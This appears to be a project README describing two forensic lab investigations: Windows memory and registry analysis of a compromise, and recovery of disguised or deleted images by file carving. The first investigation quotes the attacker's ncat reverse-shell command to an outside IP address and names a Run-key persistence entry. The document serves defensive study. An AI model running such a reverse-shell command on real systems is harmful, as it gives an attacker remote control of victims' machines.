# Endpoint Forensics & Data Recovery

## 📝 Project Overview
This module demonstrates advanced endpoint forensic techniques on Windows and Linux environments. The investigations focus on analyzing volatile memory, parsing Windows Registry hives to track threat actor movements, and utilizing file-carving techniques to recover intentionally obfuscated or deleted evidence.

## 🛠️ Tools Used
*   **Memory & Registry Analysis:** Volatility, Windows Registry (SYSTEM, NTUSER.DAT, UsrClass.dat).
*   **File Recovery & Metadata:** Scalpel, Hexdump, Exiv2, `dd`.
*   **Environment:** Windows 10 Enterprise, Linux.

## 🔍 Investigation 1: Windows Post-Mortem & Reverse Shell Analysis
**Scenario:** A subject's machine was compromised. Analyzed memory dumps and registry hives to determine the scope of the breach and identify the initial access vector.

**Key Findings:**
*   **Reverse Shell Execution:** Identified `ncat.exe` (PID 6888) executing a reverse shell (`ncat.exe -nv 10.11.8.212 443 -e cmd.exe`) to grant the attacker terminal access.
*   **Persistence Mechanisms:** Discovered a malicious autostart key named `soft_run` mapped in `Microsoft/Windows/CurrentVersion/Run`.
*   **Anti-Forensics & Encryption:** Found evidence of `bdeunlock.exe` execution, indicating the threat actor manipulated BitLocker to encrypt/lock data. Extracted the BitLocker Recovery Key from `4E3D7844-CC56-427E-89A1-DCF265F60C16.TXT`.

*Insert the Volatility `windows.info` or Ncat PID screenshot here)*
`![Reverse Shell Execution](./images/ncat-execution.png)`

## 🔍 Investigation 2: Forensic Data Recovery & Camouflage Detection
**Scenario:** A suspect attempted to hide and delete illicit image files. Conducted deep-level file system analysis to unearth the data.

**Key Findings:**
*   **Camouflaged Files:** Used header inspection (via Linux `file` and `find` utilities) to discover PNG files disguised with `.log` and `.txt` extensions (e.g., `/var/log/eruces.log`).
*   **Data Carving:** Utilized `scalpel` to carve corrupted JPEG files from the disk image. Leveraged `hexdump` to locate embedded JPEG headers (`ff d8`) and `dd` to split merged files into distinct, viewable images.
*   **Metadata Extraction:** Extracted hidden EXIF data using `exiv2` to catalog the origin and hash values (MD5) of the recovered evidence.

*Insert the Exiv2 output or a recovered image screenshot here)*
`![Exiv2 Metadata Output](./images/exiv2-output.png)`
